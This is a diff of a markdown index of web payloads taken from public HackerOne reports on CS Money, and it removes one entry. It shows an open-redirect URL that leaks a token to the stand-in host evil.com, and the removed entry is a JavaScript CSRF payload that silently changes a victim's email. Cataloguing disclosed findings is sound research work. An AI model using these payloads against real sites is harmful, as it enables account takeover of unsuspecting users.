@@ -1,6 +1,6 @@
 # CS Money
 
-11 payloads.
+10 payloads.
 
 ### `f22abfde`
 
@@ -49,22 +49,6 @@ https://target.com/#?token=Dlk9sGd8zc6OvxlITijQR&redirectUrl=https://evil.com///
 
 **Parameter:** `redirectUrl`
 — [\[cs.money\] Open Redirect Leads to Account Takeover](https://hackerone.com/reports/905607) · CS Money · [abdilahrf_](https://hackerone.com/abdilahrf_)
-
-### `8e4913c3`
-
-```
-var FormEl = `
-<form action="https://target.com/change_email" method="POST">
-        <input type="hidden" name="email" value="nnez+attacker@wearehackerone.com" />
-        <button type="submit" style="font-size:28pt;z-index:99999">Submit</button>
-    </form>
-`;
-var Div = document.createElement('div');
-Div.innerHTML = FormEl;
-document.body.appendChild(Div);
-```
-
-— [Site-wide CSRF on Safari due to CORS misconfiguration (not localhost)](https://hackerone.com/reports/975983) · CS Money · [nnez](https://hackerone.com/nnez) · $300.0
 
 ### `1f422f8a`
 
